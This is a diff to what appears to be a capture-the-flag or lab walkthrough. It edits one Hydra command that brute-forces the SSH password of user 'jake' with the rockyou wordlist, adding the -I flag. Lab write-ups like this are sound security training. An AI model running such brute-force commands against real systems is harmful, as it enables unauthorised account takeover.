@@ -59,7 +59,7 @@ The first step is running an nmap scan:
     
     Using Hydra and SSH helped find Jake’s password, which would be used in Remote SSH authentication.
     
-    `hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<IP_Address>`
+    `hydra -I -l jake -P /usr/share/wordlists/rockyou.txt ssh://<IP_Address>`
     
     ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1751918806780/d0ab9602-d2d2-4249-b064-101a4a4d48e4.png align="center")
     
